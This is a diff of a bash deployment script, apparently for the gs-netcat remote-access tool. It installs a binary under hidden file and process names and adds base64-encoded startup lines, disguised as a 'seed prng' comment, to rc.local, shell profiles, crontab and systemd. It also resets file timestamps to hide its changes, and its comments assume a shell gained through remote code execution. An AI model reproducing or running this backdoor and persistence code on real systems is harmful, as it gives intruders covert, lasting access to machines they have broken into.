+	_ts_systemd_fn_a+=("$fn")
+}
+
+# Determine the Timestamp of the file $fn that is about to be
+# created (or already exists).
+# Sets $_ts_ts to Timestamp.
+# Usage: _ts_get_ts [$fn]
+_ts_get_ts()
+{
+	local fn
+	local n
+	local pdir
+	fn="$1"
+	pdir="$(dirname "$1")"
+
+	unset _ts_ts
+	unset _ts_pdir_by_us
+	# Inherit Timestamp if parent directory was created
+	# by us.
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
+		[[ "$pdir" = "${_ts_mkdir_fn_a[$n]}" ]] && {
+			_ts_ts="${_ts_ts_a[$n]}"
+			_ts_pdir_by_us=1
+			# DEBUGF "Parent ${pdir} created by us."
+			return
+		}
+		((n++))
+	done
+
+	# Check if file exists.
+	[[ -e "$fn" ]] && _ts_ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" && return
+
+	# Take ts from oldest file in directory
+	# shellcheck disable=SC2012 #Use find instead of ls => not portable
+	oldest="${pdir}/$(ls -atr "${pdir}" 2>/dev/null | head -n1)"
+	_ts_ts="$(date -r "$oldest" +%Y%m%d%H%M.%S 2>/dev/null)"
+}
+
+
+_ts_add()
+{
+	# Retrieve TimeStamp for $1
+	_ts_get_ts "$1"
+	# Add TimeStamp
+	_ts_ts_a+=("$_ts_ts")
+	_ts_fn_a+=("$1");
+	_ts_mkdir_fn_a+=("$2")
+}
+
+# Note: Do not use global _ts variables except _ts_add_direct
+# Usage: mk_file [filename]
+mk_file()
+{
+	local fn
+	local oldest
+	local pdir
+	local pdir_added
+	fn="$1"
+	local exists
+
+	# DEBUGF "${CC}MK_FILE($fn)${CN}"
+	pdir="$(dirname "$fn")"
+	[[ -e "$fn" ]] && exists=1
+
+	ts_is_marked "$pdir" || {
+		# HERE: Parent not tracked
+		_ts_add "$pdir" "<NOT BY XMKDIR>"
+		pdir_added=1
+	}
+
+	ts_is_marked "$fn" || {
+		# HERE: Not yet tracked
+		_ts_get_ts "$fn"
+		# Do not add creation fails.
+		touch "$fn" 2>/dev/null || {
+			# HERE: Permission denied
+			[[ -n "$pdir_added" ]] && {
+				# Remove pdir if it was added above
+				# Bash <5.0 does not support arr[-1]
+				# Quote (") to silence shellcheck
+				unset "_ts_ts_a[${#_ts_ts_a[@]}-1]"
+				unset "_ts_fn_a[${#_ts_fn_a[@]}-1]"
+				unset "_ts_mkdir_fn_a[${#_ts_mkdir_fn_a[@]}-1]"
+			}
+			return 69 # False
+		}
+		[[ -z $exists ]] && chmod 600 "$fn"
+		_ts_ts_a+=("$_ts_ts")
+		_ts_fn_a+=("$fn");
+		_ts_mkdir_fn_a+=("<NOT BY XMKDIR>")
+		return
+	}
+
+	touch "$fn" 2>/dev/null || return
+	[[ -z $exists ]] && chmod 600 "$fn"
+	true
+}
+
+xrmdir()
+{
+	local fn
+	local pdir
+	fn="$1"
+
+	[[ ! -d "$fn" ]] && return
+	pdir="$(dirname "$fn")"
+
+	ts_is_marked "$pdir" || {
+		_ts_add "$pdir" "<RMDIR-UNTRACKED>"
+	}
+
+	rmdir "$fn" 2>/dev/null
+}
+
+xrm()
+{
+	local pdir
+	local fn
+	fn="$1"
+
+	[[ ! -f "$fn" ]] && return
+	pdir="$(dirname "$fn")"
+
+	ts_is_marked "$pdir" || {
+		# HERE: Parent is not tracked.
+		_ts_add "$pdir" "<RM-UNTRACKED>"
+	}
+
+	rm -f "$1" 2>/dev/null
+}
+
+# Create a directory if it does not exist and fix timestamp
+# xmkdir [directory] <ts reference file>
+xmkdir()
+{
+	local fn
+	local pdir
+	fn="$1"
+
+	DEBUGF "${CG}XMKDIR($fn)${CN}"
+	pdir="$(dirname "$fn")"
+	true # reset $?
+	[[ -d "$fn" ]] && return     # Directory already exists
+	[[ ! -d "$pdir" ]] && return # Parent dir does not exists (Huh?)
+
+	# Check if parent is being tracked
+	ts_is_marked "$pdir" || {
+		# HERE: Parent not tracked
+		# We did not create the parent or we would be tracking it.
+		_ts_add "$pdir" "<NOT BY XMKDIR>"
+	}
+
+	# Check if new directory is already tracked
+	ts_is_marked "$fn" || {
+		# HERE: Not yet tracked (normal case)
+		_ts_add "$fn" "$fn" # We create the directory (below)
+	}
+
+	mkdir "$fn" 2>/dev/null || return
+	chmod 700 "$fn"
+	true
+}
+
+xcp()
+{
+	local src
+	local dst
+	src="$1"
+	dst="$2"
+
+	# DEBUGF "${CG}XCP($src, $dst)${CN}"
+	mk_file "$dst" || return
+	cp "$src" "$dst" || return
+	true
+}
+
+xmv()
+{
+	local src
+	local dst
+	src="$1"
+	dst="$2"
+
+	[[ -e "$dst" ]] && xrm "$dst"
+	xcp "$src" "$dst" || return
+	xrm "$src"
+	true
+}
+
+clean_all()
+{
+	[[ "${#TMPDIR}" -gt 5 ]] && {
+		rm -rf "${TMPDIR:?}/"*
+		rmdir "${TMPDIR}"
+	} &>/dev/null
+
+	ts_restore
+}
+
+exit_code()
+{
+	clean_all
+
+	exit "$1"
+}
+
+errexit()
+{
+	[[ -z "$1" ]] || echo -e >&2 "${CR}$*${CN}"
+
+	exit_code 255
+}
+
+# Test if directory can be used to store executeable
+# try_dstdir "/tmp/.gs-foobar"
+# Return 0 on success.
+try_dstdir()
+{
+	local dstdir
+	local trybin
+	dstdir="${1}"
+
+	# Create directory if it does not exists.
+	[[ ! -d "${dstdir}" ]] && { xmkdir "${dstdir}" || return 101; }
+
+	DSTBIN="${dstdir}/${BIN_HIDDEN_NAME}"
+ 
+	mk_file "$DSTBIN" || return 102
+
+	# Find an executeable and test if we can execute binaries from
+	# destination directory (no noexec flag)
+	# /bin/true might be a symlink to /usr/bin/true
+	for ebin in "/bin/true" "$(command -v id)"; do
+		[[ -z $ebin ]] && continue
+		[[ -e "$ebin" ]] && break
+	done
+	[[ ! -e "$ebin" ]] && return 0 # True. Try our best
+
+	# Must use same name on busybox-systems
+	trybin="${dstdir}/$(basename "$ebin")"
+
+	# /bin/true might be a symlink to /usr/bin/true
+	[[ "$ebin" -ef "$trybin" ]] && return 0
+	mk_file "$trybin" || return
+
+	# Return if both are the same /bin/true and /usr/bin/true
+	cp "$ebin" "$trybin" &>/dev/null || { rm -f "${trybin:?}"; return; }
+	chmod 700 "$trybin"
+
+	# Between 28th April and end of May 2020 we accidentially
+	# over wrote /bin/true with gs-bd binary. Thus we use -g
+	# to make true, id and gs-bd return true (in case it's gs-bs).
+	"${trybin}" -g &>/dev/null || { rm -f "${trybin:?}"; return 104; } # FAILURE
+	rm -f "${trybin:?}"
+
+	return 0
+}
+
+
+
+# Called _after_ init_vars() at the end of init_setup.
+init_dstbin()
+{
+	if [[ -n "$GS_DSTDIR" ]]; then
+		try_dstdir "${GS_DSTDIR}" && return
+
+		errexit "FAILED: GS_DSTDIR=${GS_DSTDIR} is not writeable and executeable."
+	fi
+
+	# Try systemwide installation first
+	try_dstdir "${GS_PREFIX}/usr/bin" && return
+
+	# Try user installation
+	[[ ! -d "${GS_PREFIX}${HOME}/.config" ]] && xmkdir "${GS_PREFIX}${HOME}/.config"
+	try_dstdir "${GS_PREFIX}${HOME}/.config/${CONFIG_DIR_NAME}" && return
+
+	# Try current working directory
+	try_dstdir "${PWD}" && { IS_DSTBIN_CWD=1; return; }
+
+	# Try /tmp/.gsusr-*
+	try_dstdir "/tmp/.gsusr-${UID}" && { IS_DSTBIN_TMP=1; return; }
+
+	# Try /dev/shm as last resort
+	try_dstdir "/dev/shm" && { IS_DSTBIN_TMP=1; return; }
+
+	echo -e >&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
+	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
+	errexit
+}
+
+try_tmpdir()
+{
+	[[ -n $TMPDIR ]] && return # already set
+
+	[[ ! -d "$1" ]] && return
+
+	[[ -d "$1" ]] && xmkdir "${1}/${2}" && TMPDIR="${1}/${2}"
+}
+
+try_encode()
+{
+	local enc
+	local dec
+	local teststr
+	prg="$1"
+	enc="$2"
+	dec="$3"
+
+	teststr="blha|;id-u \'this is a long test of a very long string to test encodign decoding process # foobar"
+
+	[[ -n $ENCODE_STR ]] && return
+
+	command -v "$prg" >/dev/null && [[ "$(echo "$teststr" | $enc 2>/dev/null| $dec 2>/dev/null)" = "$teststr" ]] || return
+	ENCODE_STR="$enc"
+	DECODE_STR="$dec"
+}
+
+
+# Return TRUE if we are 100% sure it's little endian
+is_le()
+{
+	command -v lscpu >/dev/null && {
+		[[ $(lscpu) == *"Little Endian"* ]] && return 0
+		return 255
+	}
+
+	command -v od >/dev/null && command -v awk >/dev/null && {
+		[[ $(echo -n I | od -o | awk 'FNR==1{ print substr($2,6,1)}') == "1" ]] && return 0
+	}
+
+	return 255
+}
+
+init_vars()
+{
+	# Select binary
+	local arch
+	local osname
+	arch=$(uname -m)
+
+	if [[ -z "$HOME" ]]; then
+		HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
+		[[ ! -d "$HOME" ]] && errexit "ERROR: \$HOME not set. Try 'export HOME=<users home directory>'"
+		WARN "HOME not set. Using 'HOME=$HOME'"
+	fi
+
+	# set PWD if not set
+	[[ -z "$PWD" ]] && PWD="$(pwd 2>/dev/null)"
+
+	[[ -z "$OSTYPE" ]] && {
+		local osname
+		osname="$(uname -s)"
+		if [[ "$osname" == *FreeBSD* ]]; then
+			OSTYPE="FreeBSD"
+		elif [[ "$osname" == *Darwin* ]]; then
+			OSTYPE="darwin22.0"
+		elif [[ "$osname" == *OpenBSD* ]]; then
+			OSTYPE="openbsd7.3"
+		elif [[ "$osname" == *Linux* ]]; then
+			OSTYPE="linux-gnu"
+		fi
+	}
+
+	unset OSARCH
+	unset SRC_PKG
+	# User supplied OSARCH
+	[[ -n "$GS_OSARCH" ]] && OSARCH="$GS_OSARCH"
+
+	if [[ -z "$OSARCH" ]]; then
+		if [[ $OSTYPE == *linux* ]]; then 
+			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
+				OSARCH="i386-alpine"
+				SRC_PKG="gs-netcat_mini-linux-i686"
+			elif [[ "$arch" == *"armv6"* ]]; then
+				OSARCH="arm-linux"
+				SRC_PKG="gs-netcat_mini-linux-armv6"
+			elif [[ "$arch" == *"armv7l" ]]; then
+				OSARCH="arm-linux"
+				SRC_PKG="gs-netcat_mini-linux-armv7l"
+			elif [[ "$arch" == *"armv"* ]]; then
+				OSARCH="arm-linux" # RPI-Zero / RPI 4b+
+				SRC_PKG="gs-netcat_mini-linux-arm"
+			elif [[ "$arch" == "aarch64" ]]; then
+				OSARCH="aarch64-linux"
+				SRC_PKG="gs-netcat_mini-linux-aarch64"
+			elif [[ "$arch" == "mips64" ]]; then
+				OSARCH="mips64-alpine"
+				SRC_PKG="gs-netcat_mini-linux-mips64"
+				# Go 32-bit if Little Endian even if 64bit arch
+				is_le && {
+					OSARCH="mipsel32-alpine"
+					SRC_PKG="gs-netcat_mini-linux-mipsel"
+				}
+			elif [[ "$arch" == *mips* ]]; then
+				OSARCH="mips32-alpine"
+				SRC_PKG="gs-netcat_mini-linux-mips32"
+				is_le && {
+					OSARCH="mipsel32-alpine"
+					SRC_PKG="gs-netcat_mini-linux-mipsel"
+				}
+			fi
+		elif [[ $OSTYPE == *darwin* ]]; then
+			if [[ "$arch" == "arm64" ]]; then
+				OSARCH="x86_64-osx" # M1
+				## FIXME: really needs M3 here..
+				SRC_PKG="gs-netcat_mini-macOS-x86_64"
+				# OSARCH="arm64-osx" # M1
+			else
+				OSARCH="x86_64-osx"
+				SRC_PKG="gs-netcat_mini-macOS-x86_64"
+			fi
+		elif [[ ${OSTYPE,,} == *freebsd* ]]; then
+				OSARCH="x86_64-freebsd"
+				SRC_PKG="gs-netcat_mini-freebsd-x86_64"
+		elif [[ ${OSTYPE,,} == *openbsd* ]]; then
+				OSARCH="x86_64-openbsd"
+				SRC_PKG="gs-netcat_mini-openbsd-x86_64"
+		elif [[ ${OSTYPE,,} == *cygwin* ]]; then
+			OSARCH="i686-cygwin"
+			[[ "$arch" == "x86_64" ]] && OSARCH="x86_64-cygwin"
+		# elif [[ $OSTYPE == *gnu* ]] && [[ "$(uname -v)" == *Hurd* ]]; then
+				# OSARCH="i386-hurd" # debian-hurd
+		fi
+
+		[[ -z "$OSARCH" ]] && {
+			# Default: Try Alpine(muscl libc) 64bit
+			OSARCH="x86_64-alpine"
+			SRC_PKG="gs-netcat_mini-linux-x86_64"
+		}
+	fi
+
+	# Docker does not set USER
+	[[ -z "$USER" ]] && USER=$(id -un)
+	[[ -z "$UID" ]] && UID=$(id -u)
+
+	# check that xxd is working as expected (alpine linux does not have -r option)
+	try_encode "base64" "base64 -w0" "base64 -d"
+	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
+	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
+	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
+
+	# OSX's pkill matches the hidden name and not the original binary name.
+	# Because we hide as '-bash' we can not use pkill all -bash.
+	# 'killall' however matches gs-dbus and on OSX we thus force killall
+	if [[ $OSTYPE == *darwin* ]]; then
+		# on OSX 'pkill' matches the process (argv[0]) whereas on Unix
+		# 'pkill' matches the binary name.
+		KL_CMD="killall"
+		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
+	elif command -v pkill >/dev/null; then
+		KL_CMD="pkill"
+		KL_CMD_RUNCHK_UARG=("-0" "-U${UID}")
+	elif command -v killall >/dev/null; then
+		KL_CMD="killall"
+		# cygwin's killall needs the name (not the uid)
+		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
+	fi
+
+	# $PATH might be set differently in crontab/.profile. Use
+	# absolute path to binary instead:
+	KL_CMD_BIN="$(command -v "$KL_CMD")"
+	[[ -z $KL_CMD_BIN ]] && {
+		# set to something that returns 'false' so that we dont
+		# have to check for empty string in crontab/.profile
+		# (e.g. skip checking if already running and always start)
+		KL_CMD_BIN="$(command -v false)"
+		[[ -z $KL_CMD_BIN ]] && KL_CMD_BIN="/bin/does-not-exit"
+		WARN "No pkill or killall found."
+	}
+
+	# Defaults
+	# Binary file is called gs-dbus or set to same name as Process name if
+	# GS_HIDDEN_NAME is set. Can be overwritten with GS_BIN_HIDDEN_NAME=
+	if [[ -n $GS_BIN_HIDDEN_NAME ]]; then
+		BIN_HIDDEN_NAME="${GS_BIN_HIDDEN_NAME}"
+		BIN_HIDDEN_NAME_RM+=("$GS_BIN_HIDDEN_NAME")
+	else
+		BIN_HIDDEN_NAME="${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
+	fi
+	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
+	
+	SEC_NAME="${BIN_HIDDEN_NAME}.dat"
+	if [[ -n $GS_HIDDEN_NAME ]]; then
+		PROC_HIDDEN_NAME="${GS_HIDDEN_NAME}"
+		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+	else
+		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
+	fi
+
+	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
+
+	RCLOCAL_DIR="${GS_PREFIX}/etc"
+	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"
+
+	# Create a list of potential rc-files.
+	# - .bashrc is often, but not always, included by .bash_profile [IGNORE]
+	# - .bash_login is ignored if .bash_profile exists
+	# - $SHELL might not be set (if /bin/sh was gained by RCE)
+	[[ -f ~/.zshrc ]] && RC_FN_LIST+=(".zshrc")
+	if [[ -f ~/.bashrc ]]; then
+		RC_FN_LIST+=(".bashrc")
+		# Assume .bashrc is loaded by .bash_profile and .profile
+	else
+		# HERE: not bash or .bashrc does not exist
+		if [[ -f ~/.bash_profile ]]; then
+			RC_FN_LIST+=(".bash_profile")
+		elif [[ -f ~/.bash_login ]]; then
+			RC_FN_LIST+=(".bash_login")
+		fi
+	fi
+	[[ -f ~/.profile ]] && RC_FN_LIST+=(".profile")
+	[[ ${#RC_FN_LIST[@]} -eq 0 ]] && RC_FN_LIST+=(".profile")
+
+	[[ -d "${GS_PREFIX}/etc/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
+	[[ -d "${GS_PREFIX}/lib/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/lib/systemd/system"
+	WANTS_DIR="${GS_PREFIX}/etc/systemd/system" # always this
+	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
+	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
+	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
+
+	CRONTAB_DIR="${GS_PREFIX}/var/spool/cron/crontabs"
+	[[ ! -d "${CRONTAB_DIR}" ]] && CRONTAB_DIR="${GS_PREFIX}/etc/cron/crontabs"
+
+	local pids
+	# Linux 'pgrep kswapd0' would match _binary_ kswapd0 even if argv[0] is '[rcu_preempt]'
+	# and also matches kernel process '[kwapd0]'.
+	pids="$(pgrep "${BIN_HIDDEN_NAME_RX}" 2>/dev/null)"
+	# OSX's pgrep works on argv[0] proc-name:
+	[[ -z $pids ]] && pids="$(pgrep "(${PROC_HIDDEN_NAME_RX})" 2>/dev/null)"
+
+	[[ -n $pids ]] && OLD_PIDS="${pids//$'\n'/ }" # Convert multi line into single line
+	unset pids
+
+	# DL_CMD is used for help output of how to uninstall
+	if [[ -n "$GS_USELOCAL" ]]; then
+		DL_CMD="./deploy-all.sh"
+	elif command -v curl >/dev/null; then
+		DL_CMD="$DL_CRL"
+	elif command -v wget >/dev/null; then
+		DL_CMD="$DL_WGT"
+	else
+		# errexit "Need curl or wget."
+		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
+		errexit
+	fi
+
+	[[ $GS_DL == "wget" ]] && DL_CMD="$DL_WGT"
+	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
+	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
+		IS_USE_CURL=1
+		### Note: need -S (--show-errors) to process 404 for CF webhooks.
+		DL=("curl" "-fsSL" "--connect-timeout" "7" "-m900" "--retry" "3")
+		[[ -n $GS_DEBUG ]] && DL+=("-v")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("-k")
+	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
+		IS_USE_WGET=1
+		### Note: Dont use -q: Need errors to process 404 for CF webhooks
+		# Read-timeout is 900 seconds by default.
+		DL=("wget" "-O-" "--connect-timeout=7" "--dns-timeout=7")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")
+
+	else
+		DL=("false")   # Should not happen
+	fi
+
+	[[ $SHELL == *"nologin"* ]] && unset SHELL
+	[[ $SHELL == *"jail"* ]] && unset SHELL  # /usr/local/cpanel/bin/jailshell
+	[[ $SHELL == *"noshell"* ]] && unset SHELL  #  /usr/local/cpanel/bin/noshell
+	[[ $SHELL == *"/dev/null"* ]] && unset SHELL
+	# Test that shell is a good shell.
+	[[ -n $SHELL ]] && [[ "$("$SHELL" -c "echo TRUE" 2>/dev/null)" != "TRUE" ]] && unset SHELL
+
+	DEBUGF "OLD_PIDS='$OLD_PIDS'"
+	DEBUGF "SRC_PKG=$SRC_PKG"
+}
+
+mk_encode()
+{
+	echo "{ echo $(echo "$1"|${ENCODE_STR})|${DECODE_STR}|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
+}
+
+init_setup()
+{
+	[[ -n $TMPDIR ]] && try_tmpdir "${TMPDIR}" ".gs-${UID}"
+	try_tmpdir "/dev/shm" ".gs-${UID}"
+	try_tmpdir "/tmp" ".gs-${UID}"
+	try_tmpdir "${HOME}" ".gs"
+	try_tmpdir "$(pwd)" ".gs-${UID}"
+
+	if [[ -n "$GS_PREFIX" ]]; then
+		# Debuggin and testing into separate directory
+		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
+		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
+		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
+		if [[ -f "${HOME}/${RC_FN_LIST[1]}" ]]; then
+			xcp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
+		fi
+		xcp -p /etc/rc.local "${GS_PREFIX}/etc/"
+	fi
+
+	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
+	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"
+
+	touch "${TMPDIR}/.gs-rw.lock" || errexit "FAILED. No temporary directory found for downloading package. Try setting TMPDIR="
+	rm -f "${TMPDIR}/.gs-rw.lock" 2>/dev/null
+
+	# Find out which directory is writeable
+	init_dstbin
+
+	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"
+
+	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
+
+	# Do not add TERM= or SHELL= here because we do not like that to show in gs-dbus.service
+	[[ -n $GS_HOST ]] && ENV_LINE+=("GS_HOST='${GS_HOST}'")
+	[[ -n $GS_PORT ]] && ENV_LINE+=("GS_PORT='${GS_PORT}'")
+	# Add an empty item so that ${ENV_LINE[*]}GS_ARGS= adds an extra space between
+	[[ ${#ENV_LINE[@]} -ne 0 ]] && ENV_LINE+=("")
+
+	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
+
+	# There is no reliable way to check if a process is running:
+	# - Process might be running under different name. Especially OSX checks for the orginal name
+	#   but not the hidden name.
+	# - pkill or killall may have moved.
+	# The best we can do:
+	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
+	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
+	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
+	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"
+
+
+	if [[ -n $ENCODE_STR ]]; then
+		RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
+		PROFILE_LINE="$(mk_encode "$PROFILE_LINE")"
+		CRONTAB_LINE="$(mk_encode "$CRONTAB_LINE")"
+	fi
+
+	# DEBUGF "RCLOCAL_LINE=${RCLOCAL_LINE}"
+	# DEBUGF "PROFILE_LINE=${PROFILE_LINE}"
+	# DEBUGF "CRONTAB_LINE=${CRONTAB_LINE}"
+	DEBUGF "TMPDIR=${TMPDIR}"
+	DEBUGF "DSTBIN=${DSTBIN}"
+}
+
+uninstall_rm()
+{
+	[[ -z "$1" ]] && return
+	[[ ! -f "$1" ]] && return # return if file does not exist
+
+	echo "Removing $1..."
+	xrm "$1" 2>/dev/null || return
+}
+
+uninstall_rmdir()
+{
+	[[ -z "$1" ]] && return
+	[[ ! -d "$1" ]] && return # return if file does not exist
+
+	echo "Removing $1..."
+	xrmdir "$1" 2>/dev/null
+}
+
+uninstall_rc()
+{
+	local hname
+	local fn
+	hname="$2"
+	fn="$1"
+
+	[[ ! -f "$fn" ]] && return # File does not exist
+
+	grep -F -- "${hname}" "$fn" &>/dev/null || return # not installed
+
+	mk_file "$fn" || return
+
+	echo "Removing ${fn}..."
+	D="$(grep -v -F -- "${hname}" "$fn")"
+	echo "$D" >"${fn}" || return
+
+	[[ ! -s "${fn}" ]] && rm -f "${fn:?}" 2>/dev/null # delete zero size file
+}
+
+uninstall_service()
+{
+	local dir
+	local sn
+	local sf
+	dir="$1"
+	sn="$2"
+	sf="${dir}/${sn}.service"
+
+	[[ ! -f "${sf}" ]] && return
+
+	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && {
+		ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
+		# STOPPING would kill the current login shell. Do not stop it.
+		# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
+		systemctl disable "${sn}" 2>/dev/null && systemd_kill_cmd+=";systemctl stop ${sn}"
+	}
+
+	uninstall_rm "${sf}"
+} 
+
+# Rather important function especially when testing and developing this...
+uninstall()
+{
+	local hn
+	local fn
+	local cn
+	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
+		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
+			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
+			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}.dat"  # SEC_NAME
+		done
+		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}"
+		uninstall_rm "/dev/shm/${hn}"
+		uninstall_rm "/tmp/.gsusr-${UID}/${hn}"
+		uninstall_rm "${PWD}/${hn}"
+
+		uninstall_rm "${RCLOCAL_DIR}/${hn}.dat"  # SEC_NAME
+		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.dat" # SEC_NAME
+
+		uninstall_rm "/dev/shm/${hn}.dat" # SEC_NAME
+		uninstall_rm "/tmp/.gsusr-${UID}${hn}.dat" # SEC_NAME
+
+		uninstall_rm "${PWD}/${hn}.dat" # SEC_NAME
+
+		# Remove from login script
+		for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
+			uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "${hn}"
+		done 
+		uninstall_rc "${GS_PREFIX}/etc/rc.local" "${hn}"
+
+		uninstall_service "${SERVICE_DIR}" "${hn}" # SERVICE_HIDDEN_NAME
+
+		## Systemd's gs-dbus.dat
+		uninstall_rm "${SERVICE_DIR}/${hn}.dat"  # SYSTEMD_SEC_FILE / SEC_NAME
+	done
+
+	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
+		uninstall_rmdir "${GS_PREFIX}${HOME}/.config/${cn}"
+	done
+	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
+	uninstall_rmdir "/tmp/.gsusr-${UID}"
+
+	uninstall_rm "${TMPDIR}/${SRC_PKG}"
+	uninstall_rm "${TMPDIR}/._gs-netcat" # OLD
+	uninstall_rmdir "${TMPDIR}"
+
+	# Remove crontab
+	unset regex
+	regex="dummy-not-exist"
+	for str in "${BIN_HIDDEN_NAME_RM[@]}"; do
+		# Escape regular exp special characters
+		regex+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+	done
+	if [[ $OSTYPE != *darwin* ]] && command -v crontab >/dev/null; then
+		ct="$(crontab -l 2>/dev/null)"
+		[[ "$ct" =~ ($regex) ]] && {
+			[[ $UID -eq 0 ]] && mk_file "${CRONTAB_DIR}/root"
+			echo "$ct" | grep -v -E -- "($regex)" | crontab - 2>/dev/null
+		}
+	fi
+
+	[[ $UID -eq 0 ]] && systemctl daemon-reload 2>/dev/null
+
+	echo -e "${CG}Uninstall complete.${CN}"
+	echo -e "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${systemd_kill_cmd}${CN} to terminate all running shells."
+	exit_code 0
+}
+
+SKIP_OUT()
+{
+	echo -e "[${CY}SKIPPING${CN}]"
+	[[ -n "$1" ]] && echo -e "--> $*"
+}
+
+OK_OUT()
+{
+	echo -e "......[${CG}OK${CN}]"
+	[[ -n "$1" ]] && echo -e "--> $*"
+}
+
+FAIL_OUT()
+{
+	echo -e "..[${CR}FAILED${CN}]"
+	for str in "$@"; do
+		echo -e "--> $str"
+	done
+}
+
+WARN()
+{
+	echo -e "--> ${CY}WARNING: ${CN}$*"
+}
+
+WARN_EXECFAIL_SET()
+{
+	[[ -n "$WARN_EXECFAIL_MSG" ]] && return # set it once (first occurance) only
+	WARN_EXECFAIL_MSG="CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
+}
+
+WARN_EXECFAIL()
+{
+	[[ -z "$WARN_EXECFAIL_MSG" ]] && return
+	[[ -n "$ERR_LOG" ]] && echo -e "${CDR}${ERR_LOG}${CN}"
+	echo -en "${CDR}"
+	ls -al "${DSTBIN}"
+	echo -e "${CN}--> ${WARN_EXECFAIL_MSG}
+--> GS_OSARCH=${OSARCH}
+--> ${CDC}GS_DSTDIR=${DSTBIN%/*}${CN}
+--> Try to set ${CDC}export GS_DEBUG=1${CN} and deploy again.
+--> Please send that output to ${CM}root@proton.thc.org${CN} to get it fixed.
+--> Alternatively, try the static binary from
+--> ${CB}https://github.com/hackerschoice/gsocket/releases${CN}
+--> ${CDC}chmod 755 gs-netcat; ./gs-netcat -ilv${CN}."
+}
+
+HOWTO_CONNECT_OUT()
+{
+	# After all install attempts output help how to uninstall
+	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+	echo -e "--> To connect use one of the following:
+--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
+--> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
+--> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+}
+
